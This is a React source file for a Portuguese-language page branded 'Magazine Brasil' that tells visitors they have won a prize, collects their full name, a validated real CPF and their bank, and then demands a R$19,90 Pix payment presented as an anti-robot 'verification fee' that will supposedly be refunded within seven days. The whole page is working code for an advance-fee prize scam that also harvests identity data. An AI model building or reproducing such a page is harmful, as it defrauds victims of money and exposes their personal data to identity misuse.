import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import QRCode from "qrcode";
import { Copy, Check, ShieldCheck } from "lucide-react";
import { createPixTransaction } from "../lib/pix.functions";

export const Route = createFileRoute("/formulario")({
  head: () => ({
    meta: [
      { title: "Saque do prêmio — Magazine Brasil" },
      { name: "description", content: "Preencha seus dados para receber o prêmio." },
      { property: "og:title", content: "Saque do prêmio Magazine Brasil" },
      { property: "og:description", content: "Preencha o formulário para efetuar o saque." },
    ],
  }),
  component: FormularioPage,
});

const BANCOS = [
  "Banco do Brasil",
  "Bradesco",
  "Caixa Econômica",
  "Itaú",
  "Santander",
  "Nubank",
  "Inter",
  "C6 Bank",
  "PicPay",
  "Mercado Pago",
  "Outros",
];

function onlyLetters(v: string) {
  return v.replace(/[^A-Za-zÀ-ÿ\s]/g, "").replace(/\s{2,}/g, " ");
}
function onlyDigits(v: string) {
  return v.replace(/\D/g, "");
}

function isValidCpf(value: string) {
  const cpf = value.replace(/\D/g, "");
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;

  const digits = cpf.split("").map(Number);
  const firstSum = digits.slice(0, 9).reduce((sum, digit, index) => sum + digit * (10 - index), 0);
  const firstCheck = (firstSum * 10) % 11;
  if ((firstCheck === 10 ? 0 : firstCheck) !== digits[9]) return false;

  const secondSum = digits.slice(0, 10).reduce((sum, digit, index) => sum + digit * (11 - index), 0);
  const secondCheck = (secondSum * 10) % 11;
  return (secondCheck === 10 ? 0 : secondCheck) === digits[10];
}

function FormularioPage() {
  const [nome, setNome] = useState("");
  const [pix, setPix] = useState("");
  const [banco, setBanco] = useState("");
  const [showQr, setShowQr] = useState(false);
  const [qrDataUrl, setQrDataUrl] = useState("");
  const [copied, setCopied] = useState(false);
  const [premio, setPremio] = useState<number>(500);
  const [pixCode, setPixCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const cpfDigits = onlyDigits(pix);

  useEffect(() => {
    const v = sessionStorage.getItem("premio");
    if (v) setPremio(Number(v));
  }, []);

  useEffect(() => {
    if (!showQr || !pixCode) return;
    QRCode.toDataURL(pixCode, { width: 320, margin: 1 }).then(setQrDataUrl);
  }, [showQr, pixCode]);

  const canSubmit = nome.trim().length >= 3 && cpfDigits.length === 11 && Boolean(banco);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!canSubmit || loading) return;
    setErrorMsg("");
    if (!isValidCpf(cpfDigits)) {
      setErrorMsg("CPF inválido. Informe um CPF real para gerar o Pix.");
      return;
    }

    setLoading(true);
    try {
      const res = await createPixTransaction({
        data: {
          amount: 19.9,
          nome: nome.trim(),
          cpf: cpfDigits,
          premio_valor: premio,
          banco,
        },
      });
      if (!res.ok) {
        setErrorMsg(res.error);
        return;
      }
      setPixCode(res.pix_code);
      setShowQr(true);
      setTimeout(() => {
        document.getElementById("qr-card")?.scrollIntoView({ behavior: "smooth", block: "start" });
      }, 50);
    } catch (err) {
      const msg = err instanceof Error ? err.message : "Erro ao gerar Pix. Tente novamente.";
      setErrorMsg(msg);
    } finally {
      setLoading(false);
    }
  }

  async function handleCopy() {
    if (!pixCode) return;
    await navigator.clipboard.writeText(pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div className="mx-auto max-w-3xl px-5 py-8">
      <h1 className="text-2xl font-extrabold text-foreground sm:text-3xl">
        Preencha o formulário para efetuar o saque
      </h1>
      <p className="mt-2 text-sm text-muted-foreground">
        Prêmio disponível: <b className="text-foreground">R$ {premio.toLocaleString("pt-BR")}</b>
      </p>

      <form onSubmit={handleSubmit} className="mt-6 rounded-md border border-border bg-white p-5">
        <div className="flex flex-col gap-4">
          <label className="flex flex-col gap-1">
            <span className="text-sm font-semibold text-foreground">Nome completo</span>
            <input
              type="text"
              inputMode="text"
              autoComplete="name"
              value={nome}
              onChange={(e) => setNome(onlyLetters(e.target.value))}
              placeholder="Como no documento"
              className="rounded-md border border-input bg-white px-3 py-3 text-base outline-none focus:border-primary focus:ring-2 focus:ring-primary/20"
            />
          </label>

          <label className="flex flex-col gap-1">
            <span className="text-sm font-semibold text-foreground">Chave Pix (CPF)</span>
            <input
              type="tel"
              inputMode="numeric"
              value={pix}
              onChange={(e) => {
                const digits = onlyDigits(e.target.value).slice(0, 11);
                const masked = digits
                  .replace(/(\d{3})(\d)/, "$1.$2")
                  .replace(/(\d{3})(\d)/, "$1.$2")
                  .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
                setPix(masked);
              }}
              placeholder="000.000.000-00"
              className="rounded-md border border-input bg-white px-3 py-3 text-base outline-none focus:border-primary focus:ring-2 focus:ring-primary/20"
            />
          </label>

          <label className="flex flex-col gap-1">
            <span className="text-sm font-semibold text-foreground">Seu banco</span>
            <select
              value={banco}
              onChange={(e) => setBanco(e.target.value)}
              className="rounded-md border border-input bg-white px-3 py-3 text-base outline-none focus:border-primary focus:ring-2 focus:ring-primary/20"
            >
              <option value="">Selecione o banco</option>
              {BANCOS.map((b) => (
                <option key={b} value={b}>
                  {b}
                </option>
              ))}
            </select>
          </label>
        </div>

        <p className="mt-5 text-xs leading-relaxed text-muted-foreground">
          <b className="text-foreground">Atenção:</b> Para garantir que você não é um robô, é necessário a verificação com o
          pagamento de uma taxa de R$ 19,90, o valor é simbólico e será
          reembolsado em até 7 dias.
        </p>

        {errorMsg && (
          <p className="mt-3 rounded-md border border-destructive/40 bg-destructive/10 px-3 py-2 text-sm text-destructive">
            {errorMsg}
          </p>
        )}

        <button
          type="submit"
          disabled={!canSubmit || loading}
          className="mt-4 w-full rounded-md bg-primary px-6 py-4 text-lg font-extrabold uppercase tracking-wide text-primary-foreground transition-colors hover:bg-primary-strong disabled:cursor-not-allowed disabled:opacity-50"
        >
          {loading ? "Gerando Pix..." : "Gerar QRCode (R$ 19,90)"}
        </button>
      </form>

      {showQr && (
        <div
          id="qr-card"
          className="mt-6 rounded-md border border-primary/30 bg-primary-soft/40 p-5 animate-in fade-in"
        >
          <div className="flex items-center gap-2 text-sm font-semibold text-primary-strong">
            <ShieldCheck className="h-4 w-4" /> Pague R$ 19,90 via Pix para liberar o saque
          </div>

          <div className="mt-4 flex flex-col items-center gap-4 sm:flex-row sm:items-start">
            <div className="shrink-0 rounded-md border border-border bg-white p-3">
              {qrDataUrl ? (
                <img
                  src={qrDataUrl}
                  alt="QR code Pix"
                  width={200}
                  height={200}
                  className="h-[200px] w-[200px]"
                />
              ) : (
                <div className="h-[200px] w-[200px] animate-pulse bg-primary-soft" />
              )}
            </div>

            <div className="flex-1">
              <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                Pix copia e cola
              </p>
              <code className="mt-1 block max-h-32 overflow-auto break-all rounded-md border border-border bg-white p-3 text-xs text-foreground">
                {pixCode}
              </code>
              <button
                type="button"
                onClick={handleCopy}
                className="mt-3 inline-flex items-center gap-2 rounded-md bg-foreground px-4 py-2 text-sm font-semibold text-background transition-opacity hover:opacity-90"
              >
                {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                {copied ? "Copiado!" : "Copiar código"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}